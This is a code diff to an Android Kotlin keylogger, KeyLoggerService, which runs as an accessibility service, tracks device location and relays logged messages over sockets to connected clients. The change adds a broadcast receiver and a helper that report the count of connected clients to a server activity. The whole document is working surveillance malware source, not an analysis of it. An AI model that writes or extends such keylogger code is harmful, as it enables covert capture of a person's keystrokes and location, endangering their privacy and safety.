@@ -3,11 +3,16 @@ package com.example.keylogger.server
 import android.Manifest
 import android.accessibilityservice.AccessibilityService
 import android.annotation.SuppressLint
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.os.Looper
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import androidx.core.app.ActivityCompat
+import androidx.localbroadcastmanager.content.LocalBroadcastManager
 import com.google.android.gms.location.FusedLocationProviderClient
 import com.google.android.gms.location.LocationCallback
 import com.google.android.gms.location.LocationRequest
@@ -33,8 +38,17 @@ class KeyLoggerService : AccessibilityService() {
     private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())  // Coroutine scope for background tasks
     private val clientsList = ArrayList<ClientHandler>()
 
+    private val broadcastReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context?, intent: Intent?) {
+            sendMessageToActivity(clientsList.size.toString())
+        }
+    }
+
     override fun onServiceConnected() {
         super.onServiceConnected()
+
+        val intentFilter = IntentFilter(KeyLoggerService::class.java.name)
+        LocalBroadcastManager.getInstance(this).registerReceiver(broadcastReceiver, intentFilter)
 
         fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
         locationRequest = LocationRequest.Builder(
@@ -102,10 +116,12 @@ class KeyLoggerService : AccessibilityService() {
                     clientSocket,
                     {
                         clientsList.remove(it)
+                        sendMessageToActivity(clientsList.size.toString())
                     }
                 )
                 clientsList.add(clientHandler)
                 clientHandler.start()
+                sendMessageToActivity(clientsList.size.toString())
             }
         } catch (e: Exception) {
             e.printStackTrace()
@@ -117,5 +133,11 @@ class KeyLoggerService : AccessibilityService() {
             client.writeMessage(message)
         }
         Log.d("keylogger", message)
+    }
+
+    private fun sendMessageToActivity(message: String) {
+        val intent = Intent(ServerActivity::class.java.name)
+        intent.putExtra("message_key", message)
+        LocalBroadcastManager.getInstance(this).sendBroadcast(intent)
     }
 }
